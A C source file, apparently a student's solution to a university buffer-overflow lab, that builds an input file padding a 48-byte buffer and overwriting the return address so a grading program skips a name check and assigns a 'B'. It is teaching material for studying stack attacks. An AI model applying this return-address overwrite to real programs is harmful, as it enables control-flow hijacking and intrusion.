/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Isaac Wolfe                                                */
/* netid: iwolfe                                                      */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Write to a file my name ("Isaac Wolfe") followed by enough '\0' 
   characters to fill the buff array. The it writes the address of 
   the statement after the name compare in main in the return register
   as to skip over that compare and make the program assign the grade 
   of 'B' to my name. */

int main(void)
{
   FILE *psFile;
   /* Total size of buff[] (48) - Length of my name (11). */
   int LENGTH = 37;
   char name[] = "Isaac Wolfe";
   long lReturnAddress = 0x400858;
   int i;

   psFile = fopen("dataB", "w");

   /* Print my name into the file. */
   fprintf(psFile, "%s", name);

   /* Print 37 NULL characters into the file. */
   for(i = 0; i < LENGTH; i++)
   {
      putc('\0', psFile);
   }

   /* Print the return address */
   fwrite(&lReturnAddress, sizeof(long), 1, psFile);

   fclose(psFile);
   return 0;
}
